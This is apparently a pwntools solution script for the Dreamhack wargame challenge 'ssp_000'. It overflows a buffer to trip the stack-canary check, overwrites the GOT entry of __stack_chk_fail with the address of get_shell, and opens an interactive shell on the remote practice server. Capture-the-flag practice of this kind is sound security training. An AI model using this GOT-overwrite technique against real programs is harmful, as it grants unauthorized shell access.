from pwn import *


port =  9447
rem = remote("host3.dreamhack.games", port)

elf = ELF("./Dreamhack/ssp_000/problem/ssp_000")
addr = elf.got["__stack_chk_fail"]
value = elf.symbols["get_shell"]

rem.sendline(b"A" * 0x50)

rem.sendlineafter(b"Addr :", str(addr))
rem.sendlineafter(b"Value :", str(value))

rem.interactive()
